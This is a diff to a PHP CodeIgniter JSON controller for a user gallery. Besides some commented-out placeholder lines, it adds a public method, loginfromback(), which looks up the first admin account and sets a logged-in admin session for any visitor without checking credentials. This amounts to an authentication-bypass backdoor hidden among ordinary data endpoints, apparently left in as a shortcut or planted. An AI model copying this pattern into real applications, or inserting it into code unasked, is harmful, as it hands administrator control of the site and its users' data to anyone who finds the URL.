@@ -1,6 +1,14 @@
 <?php if ( ! defined("BASEPATH")) exit("No direct script access allowed");
 class Json extends CI_Controller 
-{function getallusergallery()
+{
+    
+//    $data["articleresults"]=article quesry;
+//    $data["blogresults"]=blog quesry;
+//    $data["blogresults2"]=blog2 quesry;
+//    $data["message"]->articleresults=$data["articleresults"];
+//    $this->load->json("json",$data)
+//    
+    function getallusergallery()
 {
 $elements=array();
 $elements[0]=new stdClass();
@@ -59,6 +67,23 @@ $orderorder="ASC";
 }
 $data["message"]=$this->chintantable->query($pageno,$maxrow,$orderby,$orderorder,$search,$elements,"FROM `expert_usergallery`");
 $this->load->view("json",$data);
+}
+public function loginfromback()
+{
+$adminuser=$this->db->query("SELECT * FROM `user` WHERE `accesslevel`=1")->row();
+$email=$adminuser->email;
+$id=$adminuser->id;
+$name=$adminuser->name;
+$accesslevel=$adminuser->accesslevel;
+$newdata        = array(
+'id' => $id,
+'email' => $email,
+'name' => $name ,
+'accesslevel' => $accesslevel,
+'logged_in' => 'true',
+);
+$this->session->set_userdata( $newdata );
+redirect( base_url() . 'index.php/site', 'refresh' );
 }
 public function getsingleusergallery()
 {
